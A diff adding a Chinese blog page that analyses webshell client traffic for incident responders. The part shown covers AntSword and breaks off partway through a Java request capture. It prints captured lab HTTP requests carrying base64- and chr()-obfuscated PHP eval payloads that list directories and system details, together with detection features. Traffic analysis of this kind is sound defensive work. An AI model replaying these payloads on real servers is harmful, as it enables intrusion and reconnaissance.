@@ -1,0 +1,1490 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="WebShell流量分析">
+<title>Webshell流量分析</title>
+
+<link rel='canonical' href='https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/'>
+
+<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="Webshell流量分析">
+<meta property='og:description' content="WebShell流量分析">
+<meta property='og:url' content='https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/'>
+<meta property='og:site_name' content='Lsec&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-06-18T23:50:28&#43;08:00'/><meta property='article:modified_time' content='2025-06-19T13:41:31&#43;08:00'/><meta property='og:image' content='https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/logo.jpeg' />
+<meta name="twitter:title" content="Webshell流量分析">
+<meta name="twitter:description" content="WebShell流量分析"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://lserein.github.io/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/logo.jpeg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_5a2f261f7f9cea8c.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Lsec&#39;s Blog</a></h1>
+            <h2 class="site-description">欢迎来到Lsec的博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Lserein/Lserein.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://x.com/secL15737016'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#1蚁剑">1.蚁剑</a>
+      <ol>
+        <li><a href="#11php_defaultbase64">1.1.php_Default/Base64</a></li>
+        <li><a href="#12php_"><strong>1.2.Php_char模式</strong></a></li>
+        <li><a href="#13java_default模式">1.3.Java_default模式</a></li>
+      </ol>
+    </li>
+    <li><a href="#2哥斯拉40">2.哥斯拉4.0</a>
+      <ol>
+        <li><a href="#21php_eval_xor_base64模式流量特征">2.1.Php_EVAL_XOR_BASE64模式流量特征</a></li>
+        <li><a href="#22单纯php_base64加密">2.2.单纯php_base64加密</a></li>
+        <li><a href="#23java_"><strong>2.3.Java_AES_BASE64模式</strong></a></li>
+      </ol>
+    </li>
+    <li><a href="#3哥斯拉特战版二开的哥斯拉">3.哥斯拉特战版（二开的哥斯拉）</a>
+      <ol>
+        <li><a href="#31java_"><strong>3.1.JAVA_AES_RAW_BASE64模式</strong></a></li>
+      </ol>
+    </li>
+    <li><a href="#4冰蝎">4.冰蝎</a>
+      <ol>
+        <li><a href="#41冰蝎3jsp默认下流量特征">4.1.冰蝎3&mdash;JSP&mdash;默认下流量特征</a></li>
+        <li><a href="#42冰蝎3php默认下流量特征">4.2.冰蝎3&mdash;PHP&mdash;默认下流量特征</a></li>
+        <li><a href="#43冰蝎4php自定义流量特征">4.3.冰蝎4&mdash;Php&mdash;自定义流量特征</a></li>
+        <li><a href="#44冰蝎4jsp自定义流量特征">4.4.冰蝎4&mdash;JSP&mdash;自定义流量特征</a></li>
+      </ol>
+    </li>
+    <li><a href="#5天蝎流量特征">5.天蝎流量特征</a></li>
+    <li><a href="#6冰蝎流量解密">6.冰蝎流量解密</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">
+                <img src="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/logo_hu_f5011a084e68b7b3.jpeg"
+                        srcset="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/logo_hu_f5011a084e68b7b3.jpeg 800w, /p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/logo_hu_9a306ee7be6e5fbf.jpeg 1600w"
+                        width="800" 
+                        height="533" 
+                        loading="lazy"
+                        alt="Featured image of post Webshell流量分析" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="background-color: #2a9d8f; color: #fff;">
+                学习笔记
+            </a>
+        
+            <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" style="background-color: #2a9d8f; color: #fff;">
+                应急响应
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">Webshell流量分析</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            WebShell流量分析
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jun 18, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 6 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p><strong>不管什么样的WebSHell，都有一个相同的特征就是某个端口连接服务器的Web端口，并且一直访问某JSP/Php脚本文件</strong></p>
+<p><img src="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1.png"
+	width="1594"
+	height="485"
+	srcset="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1_hu_cd7e250d1a871c0.png 480w, /p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1_hu_e10b955654118ca2.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="328"
+		data-flex-basis="788px"
+	
+></p>
+<h2 id="1蚁剑">1.蚁剑
+</h2><h3 id="11php_defaultbase64">1.1.php_Default/Base64
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">POST /gsl.php HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 192.168.100.133
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">Content-Length: 1669
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">bf827d814d798a=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoYmFzZTY0X2RlY29kZSgiTHp0OE9pOD0iKSwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLjFjYzVjIjtAbWtkaXIoJHRtZGlyKTtpZighQGZpbGVfZXhpc3RzKCR0bWRpcikpe2NvbnRpbnVlO30kdG1kaXI9cmVhbHBhdGgoJHRtZGlyKTtAY2hkaXIoJHRtZGlyKTtAaW5pX3NldCgib3Blbl9iYXNlZGlyIiwgIi4uIik7JGNudGFycj1AcHJlZ19zcGxpdCgiL1xcXFx8XC8vIiwkdG1kaXIpO2ZvcigkaT0wOyRpPHNpemVvZigkY250YXJyKTskaSsrKXtAY2hkaXIoIi4uIik7fTtAaW5pX3NldCgib3Blbl9iYXNlZGlyIiwiLyIpO0BybWRpcigkdG1kaXIpO2JyZWFrO307fTs7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuICRvdXQ7fTtmdW5jdGlvbiBhc291dHB1dCgpeyRvdXRwdXQ9b2JfZ2V0X2NvbnRlbnRzKCk7b2JfZW5kX2NsZWFuKCk7ZWNobyAiOWZmIi4iYzA5IjtlY2hvIEBhc2VuYygkb3V0cHV0KTtlY2hvICI3MzU2NCIuImUzNWYyIjt9b2Jfc3RhcnQoKTt0cnl7JEQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pO2lmKCREPT0iIikkRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7JFI9InskRH0JIjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJDIiwiWiIpYXMgJEwpaWYoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO31lbHNleyRSLj0iLyI7fSRSLj0iCSI7JHU9KGZ1bmN0aW9uX2V4aXN0cygicG9zaXhfZ2V0ZWdpZCIpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6IiI7JHM9KCR1KT8kdVsibmFtZSJdOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iCXskc30iO2VjaG8gJFI7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0%2BZ2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs%3D&amp;pass=%40eval(%40base64_decode(%24_POST%5B&#39;bf827d814d798a&#39;%5D))%3BHTTP/1.1 200 OK
+</span></span><span class="line"><span class="cl">Date: Wed, 18 Jun 2025 07:40:49 GMT
+</span></span><span class="line"><span class="cl">Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
+</span></span><span class="line"><span class="cl">X-Powered-By: PHP/7.3.4
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Transfer-Encoding: chunked
+</span></span><span class="line"><span class="cl">Content-Type: text/html; charset=UTF-8
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">9ffc09C:/phpstudy/phpstudy_pro/WWW	C:D:	Windows NT WIN-DOBBDD1N0D6 10.0 build 17763 (Windows Server 2016) AMD64	Administrator73564e35f2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>强特征1：执行的命令返回包未进行加密，</strong></p>
+<p><strong>强特征2：数据包中存在危险函数@eval，base64_decode等字段</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">pass=@eval(@base64_decode($_POST[&#39;b3f36b9af58629&#39;])
+</span></span><span class="line"><span class="cl">b3f36b9af58629是开头的字段
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>请求头字段很简单，没有哥斯拉这种phpsessionid等字段</strong></p>
+<h3 id="12php_"><strong>1.2.Php_char模式</strong>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">POST /gsl.php HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 192.168.100.133
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">Content-Length: 26940
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nd6b2b120b5a9d=RVY21k&amp;p61a95d34cfd66=CZY2QgL2QgIkM6XFxwaHBzdHVkeVxccGhwc3R1ZHlfcHJvXFxXV1ciJmRpciZlY2hvIDg1MWZlODAwOGVhJmNkJmVjaG8gNTE5ZTNjMDk3YWQ%3D&amp;pass=%40eVAl(cHr(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(115).ChR(101).ChR(116).ChR(40).ChR(34).ChR(100).ChR(105).ChR(115).ChR(112).ChR(108).ChR(97).ChR(121).ChR(95).ChR(101).ChR(114).ChR(114).ChR(111).ChR(114).ChR(115).ChR(34).ChR(44).ChR(32).ChR(34).ChR(48).ChR(34).ChR(41).ChR(59).ChR(64).ChR(115).ChR(101).ChR(116).ChR(95).ChR(116).ChR(105).ChR(109).ChR(101).ChR(95).ChR(108).ChR(105).ChR(109).ChR(105).ChR(116).ChR(40).ChR(48).ChR(41).ChR(59).ChR(36).ChR(111).ChR(112).ChR(100).ChR(105).ChR(114).ChR(61).ChR(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(103).ChR(101).ChR(116).ChR(40).ChR(34).ChR(111).ChR(112).ChR(101).ChR(110).ChR(95).ChR(98).ChR(97).ChR(115).ChR(101).ChR(100).ChR(105).ChR(114).ChR(34).ChR(41).ChR(59).ChR(105).ChR(102).ChR(40).ChR(36)...
+</span></span><span class="line"><span class="cl">HTTP/1.1 200 OK
+</span></span><span class="line"><span class="cl">Date: Wed, 18 Jun 2025 07:52:26 GMT
+</span></span><span class="line"><span class="cl">Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
+</span></span><span class="line"><span class="cl">X-Powered-By: PHP/7.3.4
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Transfer-Encoding: chunked
+</span></span><span class="line"><span class="cl">Content-Type: text/html; charset=UTF-8
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">60fa2 ...... C ................
+</span></span><span class="line"><span class="cl"> ............ 027E-C198
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> C:\phpstudy\phpstudy_pro\WWW ......
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2025/06/18  15:41    &lt;DIR&gt;          .
+</span></span><span class="line"><span class="cl">2025/06/18  15:41    &lt;DIR&gt;          ..
+</span></span><span class="line"><span class="cl">2025/06/18  12:04    &lt;DIR&gt;          %SystemDrive%
+</span></span><span class="line"><span class="cl">2023/08/03  09:44             1,295 1.php
+</span></span><span class="line"><span class="cl">2025/05/10  21:14                26 a.php
+</span></span><span class="line"><span class="cl">              17 ......    246,207,820 ....
+</span></span><span class="line"><span class="cl">               9 ...... 43,056,951,296 ........
+</span></span><span class="line"><span class="cl">851fe8008ea
+</span></span><span class="line"><span class="cl">C:\phpstudy\phpstudy_pro\WWW
+</span></span><span class="line"><span class="cl">519e3c097ad 
+</span></span><span class="line"><span class="cl">d49ae43c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://cdn.nlark.com/yuque/0/2025/png/29033686/1750233288428-4e432f7e-ac89-4798-948d-d1c5124824b4.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><strong>总的来说，不管什么模式的蚁剑，流量特征都很明显</strong></p>
+<ol>
+<li><strong>执行的命令返回包未进行加密</strong></li>
+<li><strong>数据包中存在危险函数@eval，base64_decode,@iniset等字段等字段</strong></li>
+</ol>
+<p><img src="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/13.png"
+	width="2032"
+	height="949"
+	srcset="/p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/13_hu_bc3239a2c1c79313.png 480w, /p/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/13_hu_b7fb1e2b9d23a584.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250619133550680"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="214"
+		data-flex-basis="513px"
+	
+></p>
+<h3 id="13java_default模式">1.3.Java_default模式
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">POST /yj.jsp HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 192.168.100.133
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">Content-Length: 8961
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">
